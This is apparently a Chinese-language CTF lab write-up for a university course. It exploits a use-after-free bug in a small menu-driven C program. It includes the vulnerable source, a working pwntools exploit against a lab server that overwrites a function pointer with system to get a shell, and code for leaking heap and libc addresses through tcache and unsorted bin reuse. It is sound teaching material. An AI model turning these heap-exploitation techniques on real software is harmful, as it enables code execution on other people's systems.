---
title: Simple PWN 0x38(Lab - UAF)
tags: [eductf, CTF, PWN]

category: "Security｜Course｜NTU CS｜PWN"
---

# Simple PWN 0x38(Lab - UAF)
<!-- more -->

## Background
![圖片](https://hackmd.io/_uploads/ByxvsvNr6.png)

## Source code
:::spoiler
```cpp
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void default_handle(char *event)
{
	printf("EVENT: get event named \"%s\"!\n", event);
}

struct entity
{
	char *name;
	char *event;
	void (*event_handle)(char *);
};

struct entity *entities[0x10];

int read_int()
{
	char buf[0x20];
	read(0, buf, 0x1f);
	return atoi(buf);
}

int get_idx()
{
	int idx = read_int();
	if (idx >= 0x10 || idx < 0)
		exit(0);
	return idx;
}

void memu()
{
	puts("1. register entity");
	puts("2. delete entity");
	puts("3. set name");
	puts("4. trigger event");
	printf("choice: ");
}

void register_entity()
{
	int idx;
	printf("Index: ");
	idx = get_idx();
	entities[idx] = malloc(sizeof(struct entity));
	entities[idx]->event_handle = default_handle;
	entities[idx]->event = "Default Event";
}

void delete_entity()
{
	int idx;
	printf("Index: ");
	idx = get_idx();
	if (entities[idx])
	{
		free(entities[idx]->name);
		free(entities[idx]);
	}
	else
		puts("Invalid index");
}

void set_name()
{
	int idx;
	int len;
	printf("Index: ");
	idx = get_idx();
	if (entities[idx])
	{
		printf("Nmae Length: ");
		len = read_int();
		if (len == 0)
			exit(0);
		entities[idx]->name = malloc(len);
		printf("Name: ");
		read(0, entities[idx]->name, len - 1);
	}
	else
		puts("Invalid index");
}

void trigger_event()
{
	int idx;
	printf("Index: ");
	idx = get_idx();
	if (entities[idx])
	{
		printf("Name: %s\n", entities[idx]->name);
		entities[idx]->event_handle(entities[idx]->event);
	}
}

int main(void)
{
	setvbuf(stdin, 0, 2, 0);
	setvbuf(stdout, 0, 2, 0);
	printf("gift1: %p\n", &system);
	void *ptr = malloc(0x10);
	printf("gift2: %p\n", ptr);
	for (;;)
	{
		memu();
		int choice = read_int();
		switch (choice)
		{
		case 1:
			register_entity();
			break;
		case 2:
			delete_entity();
			break;
		case 3:
			set_name();
			break;
		case 4:
			trigger_event();
		default:
			puts("Invalid command");
		}
	}
	return 0;
}

```
:::

## Recon
這是個經典的表單題，總共有四種command(註冊entity / 刪除entity / 設定entity name / 觸發entitiy function pointer)，這種題目因為格局比較大，所以我都會先看哪裡有malloc或是free，首先

* ==註冊entity==→malloc
* ==設定entity name==→malloc
* ==刪除entity==→free

然後觀察一下題目一開始會給我們system的address，和一開始的heap address，並且最後可以觸發entity的function pointer，所以目標很清楚
==設法把function pointer的地址改成system，並且event的部分改成儲存`/sh\x00`的地址==
最後只要trigger就會自動開一個shell給我們

---
根據background，我們要利用的漏洞就是最後一個，也就是利用相同的大小，把已經free掉的部分拿回來加已利用
1. 先註冊兩個entity(0和1)，第0個是要利用的部分
    ![圖片](https://hackmd.io/_uploads/ryvTkuESp.png)
2. 把`/sh\x00`寫上entity
    ![圖片](https://hackmd.io/_uploads/S1Rmxu4Ha.png)
3. 刪除entity 0
    ![圖片](https://hackmd.io/_uploads/HkQKxuVB6.png)
4. 設定system的function pointer
    這要特別說明，前面三個步驟都算是正常的步驟，而如果我們設定entity的name，此時系統會malloc一塊空間寫我們輸入的entity name，以這一題來說就會是entity 0(只要大小設定的一樣就好)，因此我們可以寫入包含system address和`/sh\x00`的位置，最後再以entity 0的身分trigger該function pointer就可以拿到shell了
    ![圖片](https://hackmd.io/_uploads/rkM7Eu4r6.png)
    ```bash
    gef➤  x/gx 0x00007f706a449d70
    0x7f706a449d70 <__libc_system>: 0x74ff8548fa1e0ff3
    gef➤  x/s 0x560bb1125300
    0x560bb1125300: "sh"
    ```
5. 最後我們再利用entity 0的名義，trigger function pointer，就拿到shell了

## Exploit
```python
from pwn import *

# r = process('./chal')
r = remote('10.113.184.121', 10057)
context.arch = 'amd64'

def register(idx):
    r.recvuntil(b'choice: ')
    r.send(b'1')
    r.recvuntil(b'Index: ')
    r.send(str(idx).encode())

def delete(idx):
    r.recvuntil(b'choice: ')
    r.send(b'2')
    r.recvuntil(b'Index: ')
    r.send(str(idx).encode())

def set_name(idx, len, name):
    r.recvuntil(b'choice: ')
    r.send(b'3')
    r.recvuntil(b'Index: ')
    r.send(str(idx).encode())
    r.recvuntil(b'Length: ')
    r.send(str(len).encode())
    r.recvuntil(b'Name: ')
    r.send(name)

def trigger_event(idx):
    r.recvuntil(b'choice: ')
    r.send(b'4')
    r.recvuntil(b'Index: ')
    r.send(str(idx).encode())

# Fetch Info
r.recvuntil(b'gift1: ')
system_addr = int(r.recvline()[:-1], 16)
r.recvuntil(b'gift2: ')
heap_addr_leak = int(r.recvline()[:-1], 16)

log.info(f'System Address = {hex(system_addr)}')
log.info(f'Heap Address = {hex(heap_addr_leak)}')

# Exploit Payload
sh_addr = heap_addr_leak + 0x60
register(0)
register(1)
set_name(1, 0x10, b'sh\x00')
delete(0)
set_name(1, 0x18, p64(0) + p64(sh_addr) + p64(system_addr))

trigger_event(0)

r.interactive()
```
```bash
$ python exp.py
[+] Opening connection to 10.113.184.121 on port 10057: Done
[*] System Address = 0x7ff8cd719290
[*] Heap Address = 0x564243d7c2a0
[*] Switching to interactive mode
Name: (null)
$ cat /home/chal/flag.txt
flag{https://www.youtube.com/watch?v=CUSUhXqThjY}
```

## 同場加映

### 如何用UAF leak heap address?
主要的大方向是設法讓free的chunk進入tcache，這樣的話他就會儲存chunk address的info，我們再利用他沒有設為null的UAF漏洞，把他讀出來
```python
register(0)
register(1)
register(2)

delete(0)
delete(1)

set_name(2, 0x18, b'a')
trigger_event(2)
r.recvuntil(b'Name: ')
leak_heap = u64(r.recv(6).ljust(0x8, b'\x00'))
heap_base = leak_heap - 0x261
log.success(f'Leak heap address = {hex(leak_heap)}')
log.success(f'Heap base address = {hex(heap_base)}')
```

```bash
$ python exp.py
[+] Starting local process './chal': pid 5092

[+] Leak heap address = 0x564bd16ca261
[+] Heap base address = 0x564bd16ca000
[*] Switching to interactive mode

EVENT: get event named "Default Event"!
Invalid command
1. register entity
2. delete entity
3. set name
4. trigger event
choice: $
```

* 這一連串的command意思是他先註冊三個entity
    ![圖片](https://hackmd.io/_uploads/S1kJGysSa.png)
* Delete 前兩個entiti的時候，第一個8 bytes是next free chunk address，第二個8 bytes是key，此時我們就可以想辦法把這個heap address leak出來，從這邊可以看得出來
    ![圖片](https://hackmd.io/_uploads/Hky5fJira.png)
* 設定entity 2的name，要加這一段的原因是它會malloc一個0x20的chunk，此時他會從tcache中找，也就是直接找到==0x55e5a806b2e0==，而他在free的時候並沒有把chunk的內容洗掉，所以裡面還是會有chunk address，所以從下面的結果來看，entity 2的name已經指向==0x000055e5a806b2e0==，而這個地址的東西沒有洗掉，所以我們可以用trigger event的printf，leak出其中的內容
    ![圖片](https://hackmd.io/_uploads/HkYmVkjBT.png)
* 此時我們就可以把接收到的address，和vmmap中得到的heap base address扣掉拿到offset之後做後續的利用
    ![圖片](https://hackmd.io/_uploads/BkcoVksST.png)
    ![圖片](https://hackmd.io/_uploads/BkKZBkoST.png)
    ![圖片](https://hackmd.io/_uploads/SJG7rJjHT.png)

### 如何用UAF leak libc address?
主要的大方向是設法讓chunk進入unsorted bin中，這樣他就會儲存有關libc的資訊，之後我們再像前面的UAF方法一樣，把值leak出來
```python

## Leak libc address
for i in range(0x9):
    register(i)
    set_name(i, 0x88, b'a')

for i in range(0x9):
    delete(i)
    
for i in range(0x8):
    register(i)
    set_name(i, 0x88, b'a')

trigger_event(7)
r.recvuntil(b'Name: ')
leak_libc = u64(r.recv(6).ljust(0x8, b'\x00'))
libc_base = leak_libc - 0x1ecc61
system_addr = libc_base + 0x52290
log.success(f'Leak libc address = {hex(leak_libc)}')
log.success(f'Libc base address = {hex(libc_base)}')
log.success(f'System address = {hex(system_addr)}')
```
```bash
$ python exp.py
[+] Starting local process './chal': pid 5414

[+] Leak libc address = 0x7fd98248dc61
[+] Libc base address = 0x7fd9822a1000
[+] System address = 0x7fd9822f3290
[*] Switching to interactive mode

EVENT: get event named "Default Event"!
Invalid command
1. register entity
2. delete entity
3. set name
4. trigger event
choice: $
```

1. 首先要先構造chunks，為了要把tcache塞滿，我們要register 9個chunk，要9個的原因是之後free掉的時候最後一個會被top chunk consolidate，所以被丟到tcache的數量就不滿8個；另外為了要進到unsorted bin中，我們的大小就不能小於0x80，這樣會被丟到fastbin中，所以chunk的順序應該會是entity 0(0x20→0x90)→entity 1(0x20→0x90)...→entity 8(0x20→0x90)→top
    ![圖片](https://hackmd.io/_uploads/By5BNboSp.png)

    ![圖片](https://hackmd.io/_uploads/Sk1KXbirT.png)
2. 接著就是把東西全部free掉，試圖塞滿tcache，可以從下圖看到他的確把最後一個chunk(0x90)併到top chunk，
    ![圖片](https://hackmd.io/_uploads/ryMpBZoBa.png)
    
    從這張圖就很清楚了，entity 0~entity 6(0x20→0x5588cd8236e0 / 0x90→0x5588cd823700)，都已經放到tcache了，那entity 7呢，他剛好因為前後都要被free，所以整個entity 7就被consolidate成0xb0的大小，而且又因為大小不符合fastbin所以被分配到unsorted bin中；而沒什麼重要的entity 8呢?首先就如前面說的，entity 8的0x90被top chunk合併了，而0x20因為tcache滿了，所以放到fastbin了
    ![圖片](https://hackmd.io/_uploads/ryIXIZjB6.png)

3. 觀察一下最重要的unsorted bin放了啥，首先本質上，他的fd還是指向unsorted bin的位址，只是該位址同時也是libc中的位址，那如果我們把這個值print出來是否就可以觀察offset的關係
    ![圖片](https://hackmd.io/_uploads/BJa5wboHT.png)
4. 現在我們要想辦法拿到unsorted bin的這個chunk，所以當然要先拿完tcache的所有東西，接著再拿一次register和set_name的時候他就會分別到fastbin拿0x20的chunk和到unsorted bin中拿0x90
    最後的結果會像這樣，可以看到entitiy的前7個都是從tcache中拿取，可以和上面的結果對照，接著也和我們預想的一樣，0x20是從fastbin拿取，而進到0x20的chunk會發現他的name指向的位址，就是unsorted bin拿到的0x90 chunk，而再進到0x90 chunk也的確像我們所說，因為他沒有清掉裡面的內容所以還有殘留libc上的info
    ![圖片](https://hackmd.io/_uploads/Byg4FZsB6.png)
    
    實際追到要print的時候，會發現如同前面所說，他會print出這個libc address info，接著我們就可以事先算好libc offset和system offset，再做後續的利用
    ![圖片](https://hackmd.io/_uploads/ByuQ9ZjHp.png)
